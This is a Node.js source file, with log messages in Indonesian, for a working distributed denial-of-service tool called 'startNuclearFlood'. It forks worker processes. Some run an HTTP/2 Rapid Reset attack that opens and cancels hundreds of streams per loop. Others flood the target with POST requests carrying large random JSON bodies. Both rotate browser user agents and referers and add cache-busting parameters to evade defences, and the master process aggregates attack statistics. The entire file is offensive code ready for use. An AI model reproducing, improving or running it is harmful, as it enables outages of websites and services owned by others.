const cluster = require('cluster');
const os = require('os');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const url = require('url');
const crypto = require('crypto');

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
];

const referers = [
    "https://www.google.com/",
    "https://www.youtube.com/",
    "https://www.facebook.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
];

function generateComplexJsonPayload() {
    const data = {
        id: crypto.randomUUID(),
        timestamp: Date.now(),
        user: {
            userId: crypto.randomBytes(16).toString('hex'),
            session: crypto.randomBytes(32).toString('hex'),
            attributes: {}
        },
        data: [],
        metadata: {
            source: "synthetic-load-generator",
            traceId: crypto.randomUUID()
        }
    };
    for (let i = 0; i < 25; i++) {
        data.user.attributes[`attr_${i}`] = crypto.randomBytes(20).toString('hex');
        data.data.push({ key: crypto.randomBytes(10).toString('hex'), value: crypto.randomBytes(100).toString('hex') });
    }
    return JSON.stringify(data);
}

function executeHttp2Attack(targetUrl, durationSeconds) { // This function runs in the worker process
    const streamsPerLoop = 500;
    let localSent = 0;
    let localError = 0;
    let loopCount = 0;
    const reportAfterLoops = 100; // Send stats to master every 100 loops (50,000 requests)

    const target = url.parse(targetUrl);
    const authority = `${target.protocol}//${target.host}`;

    console.log(`Worker ${process.pid} memulai serangan HTTP/2 Rapid Reset ke ${authority} selama ${durationSeconds} detik.`);

    const client = http2.connect(authority);
    client.on('error', () => {});
    client.on('socketError', () => {});

    let isAttackActive = true;
 
    const attack = () => {
        const headers = {
            [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
            [http2.constants.HTTP2_HEADER_PATH]: `${target.path || '/'}${target.path && target.path.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`,
            [http2.constants.HTTP2_HEADER_SCHEME]: target.protocol.replace(':', ''),
            [http2.constants.HTTP2_HEADER_AUTHORITY]: target.host,
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Referer': referers[Math.floor(Math.random() * referers.length)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
        };

        const stream = client.request(headers);
        stream.on('error', () => {
            localError++;
        });
        localSent++;
        stream.destroy();
    };
 
    const attackLoop = () => {
        if (isAttackActive && !client.destroyed) {
            for (let i = 0; i < streamsPerLoop; i++) {
                attack();
            }

            loopCount++;
            if (loopCount >= reportAfterLoops) {
                if (process.send) {
                    process.send({
                        type: 'stats',
                        sent: localSent,
                        error: localError
                    });
                }
                localSent = 0;
                localError = 0;
                loopCount = 0;
            }

            setImmediate(attackLoop);
        }
    };

    attackLoop();
 
    setTimeout(() => {
        isAttackActive = false;

        // Send final batch of stats before exiting
        if (process.send && (localSent > 0 || localError > 0)) {
            process.send({
                type: 'stats',
                sent: localSent,
                error: localError
            });
        }

        if (!client.destroyed) {
            client.destroy();
        }
        console.log(`Worker ${process.pid} telah menghentikan serangan ke ${authority}.`);
        process.exit(0);
    }, durationSeconds * 1000);
}

function executeLegacyAttack(targetUrl, durationSeconds) {
    const threads = 150;
    const delay = 150;
    let localSent = 0;
    let localError = 0;

    const statsInterval = setInterval(() => {
        if (process.send) {
            process.send({ type: 'stats', sent: localSent, error: localError });
        }
        localSent = 0;
        localError = 0;
    }, 1000);

    const target = url.parse(targetUrl);
    const protocol = target.protocol === 'https:' ? https : http;
    const agent = new protocol.Agent({ keepAlive: true, maxSockets: threads + 50 });

    console.log(`Worker ${process.pid} memulai serangan Legacy Flood ke ${targetUrl} selama ${durationSeconds} detik dengan ${threads} threads dan delay ${delay}ms.`);

    const attack = () => {
        const payload = generateComplexJsonPayload();
        const headers = {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload),
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Connection': 'keep-alive',
            'Referer': referers[Math.floor(Math.random() * referers.length)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
        };

        const req = protocol.request({
            hostname: target.hostname,
            port: target.port,
            path: `${target.path || '/'}${target.path && target.path.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`,
            method: 'POST',
            headers: headers,
            agent: agent,
        }, (res) => {
            res.on('data', () => {});
            res.on('end', () => {});
        });

        req.on('error', (err) => {
            localError++;
        });
        req.write(payload);
        req.end();
        localSent++;
    };

    const intervalIds = [];
    for (let i = 0; i < threads; i++) {
        intervalIds.push(setInterval(attack, delay));
    }

    setTimeout(() => {
        clearInterval(statsInterval);
        intervalIds.forEach(clearInterval);
        console.log(`Worker ${process.pid} telah menghentikan serangan Legacy Flood ke ${targetUrl}.`);
        process.exit(0);
    }, durationSeconds * 1000);
}

function startNuclearFlood(targetUrl, durationSeconds, statusCallback) { // This function runs in the master process
    if (cluster.isPrimary) { // Master process logic
        console.log(`Master ${process.pid} menyiapkan cluster untuk serangan.`);
        
        cluster.settings = {
            exec: __filename,
            args: [targetUrl, String(durationSeconds)],
            execArgv: ['--max-old-space-size=1024']
        };

        let totalSent = 0;
        let totalError = 0;
        let secondsRemaining = durationSeconds;

        const monitorInterval = setInterval(() => {
            secondsRemaining -= 5;
            if (secondsRemaining < 0) secondsRemaining = 0;

            const successRate = totalSent > 0 ? ((totalSent - totalError) / totalSent * 100).toFixed(2) : "0.00";

            statusCallback({
                totalSent,
                totalError,
                successRate,
                secondsRemaining
            });

            if (secondsRemaining <= 0) {
                clearInterval(monitorInterval);
            }
        }, 5000);

        const numCPUs = Math.min(os.cpus().length, 2);
        
        for (let i = 0; i < numCPUs; i++) {
            const attackType = (i % 2 === 0) ? 'http2' : 'legacy';
            const worker = cluster.fork({ ATTACK_TYPE: attackType });
            worker.on('message', (message) => {
                if (message.type === 'stats') {
                    totalSent += message.sent || 0;
                    totalError += message.error || 0;
                }
            });
        }

        cluster.on('exit', (worker) => {
            console.log(`Worker ${worker.process.pid} telah berhenti.`);
        });

        const stopAttack = () => {
            console.log("Master menerima perintah stop. Menghentikan semua worker.");
            clearInterval(monitorInterval);
            for (const id in cluster.workers) {
                if (cluster.workers[id]) {
                    cluster.workers[id].kill();
                }
            }
        };

        return { stop: stopAttack };
    }
}

if (cluster.isWorker) { // Worker process logic
    const [targetUrl, durationSeconds] = process.argv.slice(2);
    const workerAttackType = process.env.ATTACK_TYPE;
    if (workerAttackType === 'legacy') {
        executeLegacyAttack(targetUrl, parseInt(durationSeconds, 10));
    } else {
        executeHttp2Attack(targetUrl, parseInt(durationSeconds, 10));
    }
}

module.exports = { startNuclearFlood };